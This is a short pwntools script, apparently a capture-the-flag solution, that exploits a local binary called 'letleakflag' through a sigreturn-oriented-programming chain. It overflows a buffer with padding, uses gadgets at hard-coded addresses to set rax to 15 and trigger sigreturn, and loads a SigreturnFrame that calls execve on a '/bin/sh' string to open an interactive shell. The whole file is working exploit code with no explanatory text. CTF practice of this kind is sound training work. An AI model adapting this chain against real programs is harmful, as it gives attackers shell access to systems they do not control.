from pwn import *

p = process(['./letleakflag'])
context.arch = 'amd64'
gdb.attach(p, api=True)
rax = 0x0000000000041018
syscall = 0x41015
binsh = 0x41250

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = binsh
frame.rip = syscall
frame.rsi = 0


#frame = p64(0)*13 + p64(binsh) + p64(0)*4 + p64(59) + p64(0)*2 + p64(syscall) + p64(0) + p64(0x33)

payload = b"a"*8 + p64(rax) + p64(0xf) + p64(syscall) + bytes(frame)
p.sendline(payload)

p.interactive()
